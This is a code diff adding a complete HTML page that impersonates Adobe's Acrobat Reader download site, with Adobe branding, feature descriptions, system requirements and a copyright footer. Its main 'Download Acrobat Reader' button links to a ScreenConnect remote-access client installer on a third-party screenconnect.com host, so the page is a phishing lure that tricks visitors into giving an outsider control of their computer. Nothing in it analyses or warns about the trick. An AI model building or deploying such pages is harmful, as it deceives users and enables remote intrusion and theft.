@@ -1,0 +1,346 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Acrobat Reader - Free PDF Viewer</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Adobe+Clean:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #FF0000;
+            --red-dark: #D32F2F;
+            --bg-dark: #1a1a1a;
+            --text-dark: #2c2c2c;
+            --text-muted: #666;
+            --border: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        /* Header */
+        .header {
+            background: var(--bg-dark);
+            padding: 12px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .logo svg {
+            width: 30px;
+            height: 30px;
+            fill: var(--red);
+        }
+
+        .header-links a {
+            color: #b3b3b3;
+            text-decoration: none;
+            margin-left: 28px;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .header-links a:hover {
+            color: white;
+        }
+
+        /* Hero */
+        .hero {
+            background: linear-gradient(135deg, #f8f8f8 0%, #fff 100%);
+            padding: 80px 40px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 900;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+            letter-spacing: -1px;
+        }
+
+        .hero .dc-badge {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .hero p {
+            font-size: 20px;
+            color: var(--text-muted);
+            margin-bottom: 40px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: var(--red);
+            color: white;
+            padding: 16px 48px;
+            font-size: 18px;
+            font-weight: 700;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(255,0,0,0.25);
+        }
+
+        .download-btn:hover {
+            background: var(--red-dark);
+            transform: translateY(-1px);
+        }
+
+        .download-note {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #999;
+        }
+
+        .download-note a {
+            color: var(--text-muted);
+        }
+
+        /* OS Selector */
+        .os-selector {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 32px;
+        }
+
+        .os-option {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 14px;
+            background: white;
+        }
+
+        .os-option:hover, .os-option.active {
+            border-color: var(--red);
+            box-shadow: 0 2px 8px rgba(255,0,0,0.08);
+        }
+
+        .os-option svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Features */
+        .features {
+            padding: 80px 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .features h2 {
+            text-align: center;
+            font-size: 32px;
+            margin-bottom: 60px;
+            font-weight: 700;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 48px 40px;
+        }
+
+        .feature-card {
+            text-align: center;
+        }
+
+        .feature-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #fafafa;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .feature-icon svg {
+            width: 40px;
+            height: 40px;
+            color: var(--red);
+        }
+
+        .feature-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .feature-card p {
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        .footer {
+            border-top: 1px solid var(--border);
+            padding: 40px;
+            text-align: center;
+            font-size: 13px;
+            color: #999;
+        }
+
+        .footer a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin: 0 12px;
+        }
+
+        /* Language selector */
+        .lang-select {
+            background: var(--bg-dark);
+            color: #b3b3b3;
+            border: 1px solid #333;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M14.2 0H7.3l6.6 24h6.9L14.2 0zM2.8 0L0 9.1l-1.2-4.4C-1.6 3.3-.8 1.5.5.8L2.8 0zm-2 24h6.9l3-11.1-6.9-1.8L.8 24z"/>
+            </svg>
+            Adobe
+        </div>
+        <div class="header-links">
+            <a href="#">Creativity & Design</a>
+            <a href="#">PDF & E-signatures</a>
+            <a href="#">Business Solutions</a>
+            <a href="#">Support</a>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="hero">
+        <h1>Acrobat Reader <span class="dc-badge">DC</span></h1>
+        <p>More ways to work with documents and images, for free.</p>
+        <a href="https://infinityvasolutions.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Infinity&c=&c=&c=&c=&c=&c=&c=" class="download-btn">Download Acrobat Reader</a>
+        <p class="download-note">
+            By clicking the button, you agree to the <a href="#">Terms of Use</a>
+        </p>
+
+        <div class="os-selector">
+            <div class="os-option active">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+                Windows
+            </div>
+            <div class="os-option">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><path d="M12 9v6"/></svg>
+                macOS
+            </div>
+            <div class="os-option">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
+                iOS
+            </div>
+            <div class="os-option">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="2" width="18" height="20" rx="1"/><path d="M3 8h18"/></svg>
+                Android
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="features">
+        <h2>What you can do with Acrobat Reader</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><path d="M9 15l2 2 4-4"/></svg>
+                </div>
+                <h3>View, store, and share PDFs</h3>
+                <p>Get the best viewing experience for all types of PDF content. Store files online and share them with anyone.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+                </div>
+                <h3>Fill and sign</h3>
+                <p>Complete forms fast and add your signature or initials. Then share a link with others.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/></svg>
+                </div>
+                <h3>Give and get feedback</h3>
+                <p>Add text boxes, sticky notes, and highlights. Share a PDF to collect everyone's input in one file.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                </div>
+                <h3>Work from anywhere</h3>
+                <p>Access your files from any device with the free Acrobat Reader app and through the Chrome extension.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- System Requirements -->
+    <section class="features" style="background:#fafafa; max-width:none;">
+        <div style="max-width:800px; margin:0 auto;">
+            <h2>System requirements</h2>
+            <div style="background:white; border-radius:12px; padding:32px; border:1px solid var(--border);">
+                <h3 style="font-size:20px; margin-bottom:16px;">Windows</h3>
+                <ul style="color:var(--text-muted); padding-left:20px; line-height:2;">
+                    <li>Processor: Intel or AMD; 1.5 GHz or faster</li>
+                    <li>Operating system: Windows 11, 10, or 8.1</li>
+                    <li>RAM: 2 GB</li>
+                    <li>Hard disk space: 2 GB of available space</li>
+                    <li>Screen resolution: 1024 x 768</li>
+                    <li>Browser: Internet Explorer 11, Firefox, Chrome, Edge</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>
+            <a href="#">Privacy</a>
+            <a href="#">Terms of Use</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+        </p>
+        <p style="margin-top:16px;">Copyright &copy; 2024 Adobe. All rights reserved.</p>
+    </footer>
+</body>
+</html>
